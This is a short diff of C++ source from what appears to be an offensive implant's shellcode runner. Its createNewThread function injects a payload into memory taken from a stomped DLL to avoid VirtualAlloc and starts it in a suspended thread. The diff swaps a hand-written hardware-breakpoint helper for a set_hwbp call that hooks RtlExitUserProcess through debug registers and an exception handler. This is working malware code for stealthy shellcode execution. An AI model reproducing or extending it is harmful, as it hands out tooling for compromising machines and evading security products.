@@ -439,32 +439,6 @@ LONG WINAPI handlerRtlExitUserProcess(EXCEPTION_POINTERS * ExceptionInfo)
 }
 
 
-int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP) 
-{
-	CONTEXT ctx = { 0 };
-	ctx.ContextFlags = CONTEXT_ALL;
-
-	GetThreadContext(thrd, &ctx);
-	
-	if (setBP == TRUE) {
-		ctx.Dr0 = addr;
-		ctx.Dr7 |= (1 << 0);  		// Local DR0 breakpoint
-		ctx.Dr7 &= ~(1 << 16);		// break on execution
-		ctx.Dr7 &= ~(1 << 17);
-
-	}
-	else if (setBP == FALSE) {
-		ctx.Dr0 = NULL;
-		ctx.Dr7 &= ~(1 << 0);
-	}
-
-	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;	
-	SetThreadContext(thrd, &ctx);
-
-	return 0;
-}
-
-
 // Create new thread to run the shellcode, the memory use to inject the payload is taken from a DLL (Module Stomping)
 // loaded specialy for this purpose. It avoid to use VirtualAlloc.
 int AssemblyExec::createNewThread(const std::string& payload, std::string& result)
@@ -497,14 +471,9 @@ int AssemblyExec::createNewThread(const std::string& payload, std::string& resul
 	
 	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, CREATE_SUSPENDED, 0);
 
-	// AddVectoredExceptionHandler(0, &handlerRtlExitUserProcess);
-	// BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
-	// DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);
-	// SetHWBP(thread, (DWORD64) dword64Address, TRUE);
-
 	BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
 	HANDLE phHwBpHandler;
-	int indexHWBP;
+	int indexHWBP = 0;
 	set_hwbp(thread, baseAddress, handlerRtlExitUserProcess, indexHWBP, &phHwBpHandler);
 
 	if (thread != NULL) 
